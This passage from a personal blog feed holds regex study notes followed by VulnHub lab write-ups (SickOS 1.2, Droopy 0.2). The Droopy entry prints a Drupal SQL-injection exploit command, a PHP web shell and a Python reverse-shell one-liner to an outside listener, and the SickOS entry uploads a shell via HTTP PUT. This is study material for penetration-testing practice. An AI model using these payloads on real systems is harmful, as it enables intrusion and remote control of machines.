&lt;li&gt;To match multiple lines, you need to add &lt;code&gt;&#x2F;m&lt;&#x2F;code&gt; to end of line. Just like adding a global (&#x2F;g) switch.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Word boundaries&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Word boundaries references a position, not a character.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Word boundary (start&#x2F;end word boundary):&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\b
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Not a word boundary:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\B
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Watch out, it doesn&#x27;t match certain characters such as &lt;code&gt;.&lt;&#x2F;code&gt; or &lt;code&gt;-&lt;&#x2F;code&gt; or spaces unless specified&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;\b&#x2F;w+s\b&#x2F;&lt;&#x2F;code&gt; matches &amp;quot;apples&amp;quot; - This expression is efficient because you are exactly specifying the boundaries.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;apples\b&lt;&#x2F;code&gt; &lt;code&gt;\band\b&lt;&#x2F;code&gt; &lt;code&gt;\boranges&#x2F;&lt;&#x2F;code&gt; matches &amp;quot;apples and oranges&amp;quot;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;7-capturing-groups-and-backreferences&quot;&gt;7: Capturing groups and Backreferences&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Backreferences&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Allow access to captured data&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;How it works: &lt;code&gt;&#x2F;a(p{2}l)e&#x2F;&lt;&#x2F;code&gt; matches &amp;quot;apple&amp;quot; and the regex engine will store &amp;quot;ppl&amp;quot; automatically.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;\1&lt;&#x2F;code&gt; through &lt;code&gt;\9&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;(apple)&lt;&#x2F;code&gt; to &lt;code&gt;\1&#x2F;&lt;&#x2F;code&gt; matches &amp;quot;apples to apples&amp;quot;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;&amp;lt;(i|em)&amp;gt;.+?&amp;lt;&#x2F;\1&amp;gt;&#x2F;&lt;&#x2F;code&gt; matches &lt;i&gt;Hello&lt;&#x2F;i&gt; and &lt;em&gt;Hello&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Non-capturing group expressions&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Turns off capture and backreferences to optimize for speed and preserve space for captures&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;?:
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;8-lookaround-assertions&quot;&gt;8: Lookaround Assertions&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Positive lookahead assertions&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Positive lookahead assertion&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;?=
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;(?=seashore)sea&#x2F;&lt;&#x2F;code&gt; matches &amp;quot;sea&amp;quot; in &amp;quot;seashore&amp;quot; but not &amp;quot;seaside&amp;quot;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;\b[A-Za-z&#x27;]+\b(?=,)&lt;&#x2F;code&gt; matches words with commas after it but does not capture the comma&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;This is a good way to sift through large documents for specific words with symbols before or after it&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Double-testing with lookahead assertions&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;(?=^[0-5-]+$)(?=.*4321)\d{3}-\d{3}-\d{4}&lt;&#x2F;code&gt; - matches &amp;quot;555-302-4321&amp;quot; and not &amp;quot;555-245-1312&amp;quot;. Pay attention how many times it goes through and check the line&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Negative lookahead assertions&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Negative lookahead assertion:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;?!
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Used to rule out cases you specific to not search for&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;(?!seashore)sea&#x2F;&lt;&#x2F;code&gt; matches &amp;quot;sea&amp;quot; in &amp;quot;seaside&amp;quot; but not &amp;quot;seashore&amp;quot;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;online (?!.*training)&#x2F;&lt;&#x2F;code&gt; does not match &amp;quot;online video training&amp;quot;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Lookbehind assertions&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Lookbehind positive assertion:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;?&amp;lt;=
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Lookbehind negative assertion:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;?&amp;lt;!
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;(?&amp;lt;=base)ball&#x2F;&lt;&#x2F;code&gt; matches the &amp;quot;ball&amp;quot; in &amp;quot;baseball&amp;quot; but not &amp;quot;football&amp;quot;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;(?!=base)ball&#x2F;&lt;&#x2F;code&gt; matches the &amp;quot;ball&amp;quot; in &amp;quot;football&amp;quot; but not &amp;quot;baseball&amp;quot;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Alternation only with fixed-length items&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Allowed: &lt;code&gt;(?&amp;lt;=cat|dog|rat)&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Not allowed: &lt;code&gt;(?&amp;lt;=apple|banana|plum)&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The power of positions&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Zero-width means zero position movement&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;(?&amp;lt;![$\d])(?=\d+\.\d\d)&#x2F;&lt;&#x2F;code&gt; - doesn&#x27;t match either &amp;quot;54.00&amp;quot; or &amp;quot;$54.00&amp;quot;. It moves the cursor infront of the 5 instead, no insertion of characters or anything, just the cursor. This is an ideal situation where you don&#x27;t need to do a text replacement but instead text insertion like commas between large numbers 123,123,123.00 rather than 123123123.00&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;9-unicode-and-multibyte-characters&quot;&gt;9: Unicode and Multibyte characters&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;Briefly glanced at it, not interested as it doesn&#x27;t apply to me yet. Never had an experience with unicode issues yet.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>SickOS 1.2</title>
        <published>2019-02-14T00:00:00+00:00</published>
        <updated>2019-02-14T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/vulnhub-sickos12/" type="text/html"/>
        <id>https://johntuyen.com/posts/vulnhub-sickos12/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Initiated nmap scans.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Port 22 and 80 are open.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Initiated &lt;code&gt;dirbuster&lt;&#x2F;code&gt; and &lt;code&gt;nikto&lt;&#x2F;code&gt; scans.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;dirbuster&lt;&#x2F;code&gt; showed that it found a &lt;code&gt;&#x2F;test&lt;&#x2F;code&gt; folder. Navigating to it shows a blank directory.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I got stuck with wondering what I should do here. I looked at the video for a hint and they executed this command:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl -v -X&lt;&#x2F;span&gt;&lt;span&gt; OPTIONS http:&#x2F;&#x2F;sickos&#x2F;test
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;This cURL clue is something I should have guessed if I thought about it harder. It&#x27;s like probing with telnet except it&#x27;s a URL.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The cURL result came back as &lt;code&gt;PUT&lt;&#x2F;code&gt; allowable. Going to try and upload a shell:&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nmap -p&lt;&#x2F;span&gt;&lt;span&gt; 80 sickos&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --script&lt;&#x2F;span&gt;&lt;span&gt; http-put&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --script-args&lt;&#x2F;span&gt;&lt;span&gt; http-put.url=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;test&#x2F;portscan.sh&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,http-put.file=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;portscan.sh&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h2 id=&quot;today-i-learned&quot;&gt;Today I learned&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Good for future reference of where the wordlists are located&amp;quot;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-small.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;Dirbuster&lt;&#x2F;code&gt; in headless mode is useless when you need information fast because of how it displays information in the terminal.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;This command says file has been uploaded but it only creates the filename but zero bytes transferred. Use the nmap PUT method instead.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl -v -X&lt;&#x2F;span&gt;&lt;span&gt; PUT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -d &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;nikto3.log&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; http:&#x2F;&#x2F;sickos&#x2F;test&#x2F;nikto3.log
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;setookit&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;No need to create a bash script, just use nc to scan the port ranges.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nc -zv -w&lt;&#x2F;span&gt;&lt;span&gt; 1 localhost 1-1024
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;nmap.org&#x2F;nsedoc&#x2F;scripts&#x2F;http-put.html&quot;&gt;https:&#x2F;&#x2F;nmap.org&#x2F;nsedoc&#x2F;scripts&#x2F;http-put.html&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;improvement-for-next-time&quot;&gt;Improvement for next time&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;I should have known that the ports were locked down because I couldn&#x27;t retrieve files using &lt;code&gt;wget&lt;&#x2F;code&gt;. Next time if I do have lowpriv shell with access to &lt;code&gt;nc&lt;&#x2F;code&gt;, use the port scan switches. Although, it didn&#x27;t work for me as it kept on timing out. I think only port 443 is allowed but it&#x27;s occupied by my own &lt;code&gt;nc&lt;&#x2F;code&gt; port to catch the shell. If this is the case, keep using the &lt;code&gt;nmap&lt;&#x2F;code&gt; &lt;code&gt;PUT&lt;&#x2F;code&gt; method as a transfer method on port 80.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Learning more about privesc for linux. More specifically, I should learn about where to look for escalation possiblities such as application exploitation or simple cronjobs. So far I&#x27;ve been hunting for kernel exploits and this time it didn&#x27;t work out but no exploits were able to execute on this system.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Droopy 0.2</title>
        <published>2019-02-07T00:00:00+00:00</published>
        <updated>2019-02-07T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/vulnhub-droopy02/" type="text/html"/>
        <id>https://johntuyen.com/posts/vulnhub-droopy02/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Initiated nmap scans using my own custom scripts.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Port 80 is opened and running Drupal 7. &lt;code&gt;robots.txt&lt;&#x2F;code&gt; shows a lot of disallowed listings.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;After enumerating the disallowed list, I found out drupal 7.30 is installed.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;34992&quot;&gt;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;34992&lt;&#x2F;a&gt; - Drupal SQL injection to create administrator credentials&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cp&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;34992.py .&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;python&lt;&#x2F;span&gt;&lt;span&gt; 34992.py http:&#x2F;&#x2F;droopy&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -u&lt;&#x2F;span&gt;&lt;span&gt; admin1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -p&lt;&#x2F;span&gt;&lt;span&gt; admin1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;It found the site was vulnerable and created account. Using account as &amp;quot;admin&amp;quot; doesn&#x27;t work as it says you need to active or it&#x27;s a blocked account.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Continuing enumeration process:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nikto -h&lt;&#x2F;span&gt;&lt;span&gt; droopy
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;droopy&#x2F;info.php&quot;&gt;http:&#x2F;&#x2F;droopy&#x2F;info.php&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Ubuntu Linux 3.13.0-43-generic&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Apache 2.4.7&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;PHP&#x2F;5.5.9-1ubuntu4.5&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;nikto&lt;&#x2F;code&gt; also shows that the page can be exploited by Remote File Inclusion (RFI).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Rabbit hole&lt;&#x2F;strong&gt; - There was a lot of research of UDP and TCP ports and testing out possible exploits. This is a bad rabbit hole to fall into.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;There was a lot of trial and error at this point for me. I was digging through on how I would execute php files but had no luck with the default uploading forms. When I tried uploading a php file, it would auto rename to txt format. I had tried Googling how you would bypass this mechanism but it&#x27;s a setting that you will need to edit through CLI. After spending a couple of hours, I took a peak at a walkthrough on how you would perform RFI.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;In the control panel, go to &lt;code&gt;Modules&lt;&#x2F;code&gt; and enable &lt;code&gt;PHP filter&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Once enabled, configure modify two PHP filter permissions to allow PHP code text format option and for settings.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Create a new &amp;quot;Block&amp;quot; page and add the RFI code in the body:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pre&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;?php system($_GET[&amp;#39;c&amp;#39;]) ?&amp;gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pre&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Setup netcat:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nc -nvlp&lt;&#x2F;span&gt;&lt;span&gt; 1234
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Execute python reverse shell one liner:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;droopy&#x2F;index.php?c&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;python &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-c &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.242.2.3&amp;quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;&#x2F;bin&#x2F;sh&amp;quot;,&amp;quot;-i&amp;quot;]);&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Initiated enumeration process for privesc.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;linuxprivchecker.py&lt;&#x2F;code&gt; showed interesting mail data at &lt;code&gt;&#x2F;var&#x2F;mail&#x2F;www-data&lt;&#x2F;code&gt; hinting something about &lt;code&gt;rockyou.txt&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Performed exploit for linux kernel 3.13.0 - &lt;a href=&quot;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;37292&quot;&gt;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;37292&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;ROOTED!&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;today-i-learned&quot;&gt;Today I learned&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;In step 7, notice that the variable &amp;quot;c&amp;quot; is important. When you execute the RFI URL, you need to have &amp;quot;c&amp;quot; as the variable after the php file so for example &lt;code&gt;http:&#x2F;&#x2F;droopy&#x2F;index.php?c=pwd&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;improvement-for-next-time&quot;&gt;Improvement for next time&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;I did have a hunch that if it didn&#x27;t run my php code natively after creating a page, I should have looked into how you would enable the PHP feature. It was infront of my face but didn&#x27;t carry though with the task.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I tried even using the PDF header trick to pass on a php file but that was useless.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;What I really got sidetracked was not fully understanding how RFI works. The part where you have to craft a URL to trigger the RFI.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>BTRSys 2.1</title>
        <published>2019-02-03T00:00:00+00:00</published>
        <updated>2019-02-03T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/vulnhub-btrsys21/" type="text/html"/>
        <id>https://johntuyen.com/posts/vulnhub-btrsys21/</id>
        
        <content type="html">&lt;p&gt;&lt;code&gt;Prior to studying OSCP&lt;&#x2F;code&gt;{:.info}&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Used &lt;code&gt;zenmap&lt;&#x2F;code&gt; GUI to scan 192.168.225.0&#x2F;24 range.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nmap -T4 -A -v&lt;&#x2F;span&gt;&lt;span&gt; 192.168.225.1-254
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
